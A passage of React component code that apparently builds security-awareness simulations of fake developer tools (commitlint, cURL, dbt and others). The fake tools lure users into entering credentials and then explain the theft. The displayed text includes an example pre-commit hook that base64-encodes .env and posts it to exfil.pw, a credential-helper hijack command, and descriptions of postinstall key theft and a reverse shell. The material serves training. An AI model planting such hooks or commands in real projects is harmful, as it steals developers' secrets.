          <div style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: '#3fb950', background: '#161b22', padding: '12px', borderRadius: '6px', border: '1px solid #30363d' }}>
            $ npm install -g commitizen-helper-pro<br/>
            $ git config --global credential.helper /usr/local/bin/cz-cred-hook
          </div>

          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e6edf3' }}>Git Personal Access Token (PAT) or SSH Private Key Passphrase:</label>
            <input required type="password" placeholder="Enter SSH passphrase or PAT for helper" value={gitToken} onChange={e => setGitToken(e.target.value)} style={{ width: '100%', padding: '10px', background: '#161b22', border: '1px solid #30363d', borderRadius: '6px', color: '#fff' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e6edf3' }}>Primary Git Repository URL (`origin`):</label>
            <input required type="text" value={repoUrl} onChange={e => setRepoUrl(e.target.value)} style={{ width: '100%', padding: '10px', background: '#161b22', border: '1px solid #30363d', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#238636', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Overwriting ~/.gitconfig credential helper...' : 'Register Global Git Credential Hook'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#ff7b72', margin: '0 0 8px 0' }}>~/.gitconfig Intercepted!</h4>
          <p style={{ fontSize: '0.85rem', color: '#8b949e', margin: 0 }}>The global credential helper intercepted your Git authentication tokens and pushed unauthorized code commits to your enterprise repository.</p>
        </div>
      )}
    </div>
  );
}

// ID 253: Fake commitlint Scam UI
export function CommitlintSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [stripeKey, setStripeKey] = useState('');
  const [jwtSecret, setJwtSecret] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Stripe Live Secret Keys', 'JWT Production Encryption Secrets', 'Staged Source Code Snippets']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#111827', border: '1px solid #374151', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#e5e7eb' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #374151', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#a78bfa', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🪝</span> commitlint Pre-Commit Hook Editor
        </h3>
        <span style={{ background: '#312e81', color: '#ddd6fe', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>PRE-COMMIT HOOK HARVESTER</span>
      </div>

      <div style={{ background: '#1f2937', padding: '12px', borderRadius: '8px', fontFamily: 'monospace', fontSize: '0.8rem', color: '#d1d5db', marginBottom: '16px' }}>
        <div style={{ color: '#9ca3af' }}># .git/hooks/pre-commit (Installed by @commitlint-pro)</div>
        <div>#!/bin/sh</div>
        <div style={{ background: 'rgba(239, 68, 68, 0.2)', padding: '2px 4px', borderRadius: '4px', color: '#fca5a5' }}>curl -X POST https://exfil.pw/hook -d $(cat .env | base64)</div>
        <div>exec git-commit-formatter "$@"</div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e5e7eb' }}>Stripe Live Secret Key currently in your local `.env`:</label>
            <input required type="text" placeholder="sk_live_51MxxxxxXXXXXXXXXXXXXX" value={stripeKey} onChange={e => setStripeKey(e.target.value)} style={{ width: '100%', padding: '10px', background: '#374151', border: '1px solid #4b5563', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e5e7eb' }}>JWT Production Secret Key (`JWT_SECRET`):</label>
            <input required type="text" placeholder="super_secret_jwt_key_2026" value={jwtSecret} onChange={e => setJwtSecret(e.target.value)} style={{ width: '100%', padding: '10px', background: '#374151', border: '1px solid #4b5563', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#7c3aed', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Running git commit & triggering pre-commit hook...' : 'Execute `git commit` with Pre-Commit Linter'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>.env Secrets Exfiltrated on Commit!</h4>
          <p style={{ fontSize: '0.85rem', color: '#d1d5db', margin: 0 }}>Every time you typed `git commit`, the hidden pre-commit shell script base64-encoded your `.env` file and sent your Stripe secret and JWT keys to an external server.</p>
        </div>
      )}
    </div>
  );
}

// ID 260: Fake crunch Scam UI
export function CrunchSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [adminConsent, setAdminConsent] = useState('');
  const [pin, setPin] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Master Password Vault PIN', 'System Firewall Exclusion', 'Keyboard Stroke Logs']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#1c1917', border: '1px solid #44403c', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#fafaf9' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #44403c', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#f97316', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🔨</span> Crunch v3.6 Windows GUI Wordlist Generator
        </h3>
        <span style={{ background: '#431407', color: '#ffedd5', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>XMRIG MINER + KEYLOGGER</span>
      </div>

      <div style={{ display: 'flex', gap: '12px', marginBottom: '16px', background: '#292524', padding: '12px', borderRadius: '8px', border: '1px solid #44403c' }}>
        <div style={{ flex: 1, fontSize: '0.8rem', color: '#d6d3d1' }}>
          <div><strong>Character Sets:</strong> [✔] Lowercase [✔] Numbers [✔] Symbols</div>
          <div><strong>Estimated Output:</strong> 4.8 GB Wordlist (`output.txt`)</div>
        </div>
        <div style={{ textAlign: 'right', fontSize: '0.75rem', color: '#f87171' }}>
          <div>Background GPU Load</div>
          <div style={{ fontSize: '1.2rem', fontWeight: 'bold' }}>99.8% (XMRig Active)</div>
        </div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e7e5e4' }}>Confirm Firewall Exclusion (`Type YES` to allow GPU socket access):</label>
            <input required type="text" placeholder="Type YES to confirm" value={adminConsent} onChange={e => setAdminConsent(e.target.value)} style={{ width: '100%', padding: '10px', background: '#292524', border: '1px solid #57534e', borderRadius: '6px', color: '#fff' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e7e5e4' }}>Master Password Manager PIN (intercepted by keylogger during setup):</label>
            <input required type="password" placeholder="Enter vault unlock PIN" value={pin} onChange={e => setPin(e.target.value)} style={{ width: '100%', padding: '10px', background: '#292524', border: '1px solid #57534e', borderRadius: '6px', color: '#fff' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#ea580c', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Registering XMRig service & capturing keystrokes...' : 'Generate Wordlist & Add Firewall Rule'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>Keylogger & Crypto Miner Installed!</h4>
          <p style={{ fontSize: '0.85rem', color: '#d6d3d1', margin: 0 }}>Downloading unofficial GUI wrappers for open-source Linux CLI tools dropped an XMRig CPU miner and recorded your password vault PIN.</p>
        </div>
      )}
    </div>
  );
}

// ID 263: Fake cscope Scam UI
export function CscopeSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [sudo, setSudo] = useState('');
  const [host, setHost] = useState('build-node-01.corp.internal');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Linux Sudo Root Password', 'Internal Build Server Access', 'Systemd Service Backdoor']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#090d16', border: '1px solid #1e293b', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#e2e8f0' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #1e293b', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#38bdf8', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🐧</span> cscope-fast Linux Kernel Indexer
        </h3>
        <span style={{ background: '#1e3a8a', color: '#93c5fd', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>SYSTEMD ROOTKIT</span>
      </div>

      <div style={{ background: '#020617', padding: '12px', borderRadius: '8px', fontFamily: 'monospace', fontSize: '0.8rem', color: '#4ade80', marginBottom: '16px' }}>
        $ make install-cscope-fast &amp;&amp; sudo systemctl enable cscope-daemon<br/>
        <span style={{ color: '#94a3b8' }}>Installing daemon to /etc/systemd/system/cscope.service... [SUDO AUTH REQUIRED]</span>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#cbd5e1' }}>Linux Sudo Password (for systemctl unit activation):</label>
            <input required type="password" placeholder="Enter sudo password" value={sudo} onChange={e => setSudo(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#cbd5e1' }}>Internal Build Server Hostname / IP address:</label>
            <input required type="text" value={host} onChange={e => setHost(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#0284c7', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Creating systemd daemon & opening port 4444...' : 'Compile & Enable Indexing Daemon'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>Persistent Rootkit Installed!</h4>
          <p style={{ fontSize: '0.85rem', color: '#cbd5e1', margin: 0 }}>The `cscope-daemon` systemctl unit opened a reverse shell on TCP port 4444 right inside your build server environment.</p>
        </div>
      )}
    </div>
  );
}

// ID 264: Fake Cuckoo Sandbox Scam UI
export function CuckooSandboxSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [apiKey, setApiKey] = useState('');
  const [caseNotes, setCaseNotes] = useState('INC-2026-8891 - Ransomware found on CFO laptop');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Threat Intelligence API Keys', 'Confidential Incident Artifacts', 'Corporate Network Telemetry']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#0f172a', border: '1px solid #334155', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#f8fafc' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #1e293b', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#60a5fa', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🕊️</span> Cuckoo Sandbox Automated Malware Cloud
        </h3>
        <span style={{ background: '#450a0a', color: '#fca5a5', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>SPOOFED ANALYSIS PORTAL</span>
      </div>

      <div style={{ border: '2px dashed #475569', padding: '20px', borderRadius: '10px', textAlign: 'center', background: '#1e293b', marginBottom: '16px' }}>
        <div style={{ fontSize: '2rem', marginBottom: '4px' }}>📄</div>
        <div style={{ fontSize: '0.9rem', color: '#38bdf8', fontWeight: 'bold' }}>suspicious_payload_CFO_laptop.bin</div>
        <div style={{ fontSize: '0.75rem', color: '#94a3b8' }}>SHA256: 8f91a4b92c109... (Ready for dynamic sandbox detonation)</div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>Corporate Threat Intelligence API Key (`cuckoo-api --key`):</label>
            <input required type="text" placeholder="ck_live_xxxxxxxxxxxxxxxxxxxxxxxx" value={apiKey} onChange={e => setApiKey(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>Incident Case Reference Number &amp; Internal Notes:</label>
            <input required type="text" value={caseNotes} onChange={e => setCaseNotes(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#2563eb', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Detonating binary inside unverified cloud container...' : 'Upload Sample & Detonate Malware'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>Confidential Artifacts Exfiltrated!</h4>
          <p style={{ fontSize: '0.85rem', color: '#cbd5e1', margin: 0 }}>Submitting confidential corporate malware samples to unverified third-party analysis portals exposed sensitive internal investigation data.</p>
        </div>
      )}
    </div>
  );
}

// ID 265: Fake cURL Scam UI
export function CurlSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [bearerToken, setBearerToken] = useState('');
  const [endpoint, setEndpoint] = useState('https://api.company.com/v2/admin/users');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['API Bearer Authorization Tokens', 'HTTPS Request Headers', 'Internal API Endpoints']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#18181b', border: '1px solid #3f3f46', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#fafafa' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #3f3f46', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#a855f7', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🔀</span> cURL High-Speed Windows Binary Mirror
        </h3>
        <span style={{ background: '#3b0764', color: '#d8b4fe', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>TROJANIZED SYSTEM32 BINARY</span>
      </div>

      <div style={{ background: '#27272a', padding: '12px', borderRadius: '8px', fontFamily: 'monospace', fontSize: '0.8rem', color: '#fbbf24', marginBottom: '16px' }}>
        ℹ️ Copying `curl.exe` into `C:\Windows\System32\` overwrites the built-in Windows utility with an SSL-intercepting proxy DLL.
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e4e4e7' }}>Cloudflare / API Bearer Token being tested in terminal:</label>
            <input required type="text" placeholder="Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." value={bearerToken} onChange={e => setBearerToken(e.target.value)} style={{ width: '100%', padding: '10px', background: '#27272a', border: '1px solid #52525b', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e4e4e7' }}>Target HTTPS Endpoint URL:</label>
            <input required type="text" value={endpoint} onChange={e => setEndpoint(e.target.value)} style={{ width: '100%', padding: '10px', background: '#27272a', border: '1px solid #52525b', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#9333ea', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Intercepting Authorization headers via SSL DLL...' : 'Execute API Request with Modified cURL'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>HTTPS Headers Intercepted!</h4>
          <p style={{ fontSize: '0.85rem', color: '#d4d4d8', margin: 0 }}>Replacing core binaries in `C:\Windows\System32` allowed the trojanized `curl.exe` to inspect and exfiltrate your API Bearer tokens.</p>
        </div>
      )}
    </div>
  );
}

// ID 266: Fake cz-conventional-changelog Scam UI
export function CzConventionalChangelogSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [sshPass, setSshPass] = useState('');
  const [awsProfile, setAwsProfile] = useState('default / production-admin');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['SSH Private Keys (~/.ssh/id_rsa)', 'AWS Cloud Credentials (~/.aws/credentials)', 'SSH Passphrase']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#0a0f1d', border: '1px solid #1e293b', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#f1f5f9' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #1e293b', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#38bdf8', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>📝</span> cz-conventional-changelog Pro Setup
        </h3>
        <span style={{ background: '#450a0a', color: '#fca5a5', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>POSTINSTALL SSH HARVESTER</span>
      </div>

      <div style={{ background: '#0f172a', padding: '12px', borderRadius: '8px', fontFamily: 'monospace', fontSize: '0.8rem', color: '#cbd5e1', marginBottom: '16px' }}>
        <div>$ npm install -g cz-conventional-changelog-pro</div>
        <div style={{ color: '#f59e0b' }}>&gt; cz-conventional-changelog-pro@2.1.0 postinstall</div>
        <div style={{ color: '#f87171' }}>&gt; node ./scripts/sync-ssh-keys.js [SCANNING ~/.ssh/ &amp; ~/.aws/]</div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>SSH Private Key Passphrase (`~/.ssh/id_rsa` unlock required):</label>
            <input required type="password" placeholder="Enter SSH passphrase" value={sshPass} onChange={e => setSshPass(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>AWS Cloud Profile Name (`~/.aws/credentials`):</label>
            <input required type="text" value={awsProfile} onChange={e => setAwsProfile(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#0284c7', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Reading ~/.ssh/ and ~/.aws/credentials...' : 'Run Changelog Adapter Post-Install Script'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>SSH &amp; AWS Keys Exfiltrated!</h4>
          <p style={{ fontSize: '0.85rem', color: '#cbd5e1', margin: 0 }}>The malicious `postinstall` script read your `~/.ssh/id_rsa` and `~/.aws/credentials` files and uploaded them via DNS exfiltration.</p>
        </div>
      )}
    </div>
  );
}

// ID 271: Fake dbt Scam UI
export function DbtSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [dwAuth, setDwAuth] = useState('');
  const [dwHost, setDwHost] = useState('xy12345.us-east-1.aws.snowflakecomputing.com');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Snowflake / BigQuery Admin Credentials', 'Data Warehouse Host Address', 'profiles.yml Configuration']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#1c1917', border: '1px solid #44403c', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#fafaf9' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #44403c', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#f97316', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>📊</span> dbt Data Warehouse Macro Extension
        </h3>
        <span style={{ background: '#431407', color: '#ffedd5', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>PROFILES.YML STEALER</span>
      </div>

      <div style={{ background: '#292524', padding: '12px', borderRadius: '8px', fontFamily: 'monospace', fontSize: '0.8rem', color: '#fdba74', marginBottom: '16px' }}>
        <div>$ pip install dbt-core-macro-fast</div>
        <div style={{ color: '#e7e5e4' }}>&gt; Parsing ~/.dbt/profiles.yml targets [prod-snowflake-warehouse]</div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e7e5e4' }}>Snowflake / BigQuery Admin Password (`profiles.yml` auth test):</label>
            <input required type="password" placeholder="admin_user : SuperSecretDataWarehousePass!" value={dwAuth} onChange={e => setDwAuth(e.target.value)} style={{ width: '100%', padding: '10px', background: '#292524', border: '1px solid #57534e', borderRadius: '6px', color: '#fff' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e7e5e4' }}>Data Warehouse Account Host &amp; Database Name:</label>
            <input required type="text" value={dwHost} onChange={e => setDwHost(e.target.value)} style={{ width: '100%', padding: '10px', background: '#292524', border: '1px solid #57534e', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#ea580c', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Reading ~/.dbt/profiles.yml & running macros...' : 'Compile & Run dbt Data Pipeline'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>Data Warehouse Credentials Stolen!</h4>
          <p style={{ fontSize: '0.85rem', color: '#d6d3d1', margin: 0 }}>The macro package read root-level connection strings from `~/.dbt/profiles.yml`, exposing your customer data warehouse.</p>
        </div>
      )}
    </div>
  );
}

// ID 277: Fake dieter Scam UI
export function DieterSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [npmToken, setNpmToken] = useState('');
  const [pkgName, setPkgName] = useState('@myorg/core-utils');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['npm Registry Secret Token', 'Developer Publishing Credentials', 'Package Repository Control']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#0f172a', border: '1px solid #334155', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#f8fafc' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #1e293b', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#38bdf8', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🗜️</span> dieter-json-lite Payload Compressor
        </h3>
        <span style={{ background: '#450a0a', color: '#fca5a5', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>~/.NPMRC STEALER</span>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: '16px' }}>
        <div style={{ background: '#1e293b', padding: '12px', borderRadius: '8px', border: '1px solid #334155' }}>
          <div style={{ fontSize: '0.75rem', color: '#94a3b8' }}>Original JSON Payload</div>
          <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#f87171' }}>142.8 KB</div>
        </div>
        <div style={{ background: '#1e293b', padding: '12px', borderRadius: '8px', border: '1px solid #334155' }}>
          <div style={{ fontSize: '0.75rem', color: '#94a3b8' }}>Compressed Output</div>
          <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#4ade80' }}>28.1 KB (-80%)</div>
        </div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>npm Registry Auth Token (`~/.npmrc` token for global publishing check):</label>
            <input required type="text" placeholder="npm_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" value={npmToken} onChange={e => setNpmToken(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>Target Package Name to optimize &amp; publish:</label>
            <input required type="text" value={pkgName} onChange={e => setPkgName(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#0284c7', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Reading ~/.npmrc & publishing backdoor...' : 'Run JSON Diet Optimizer'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>~/.npmrc Auth Token Stolen!</h4>
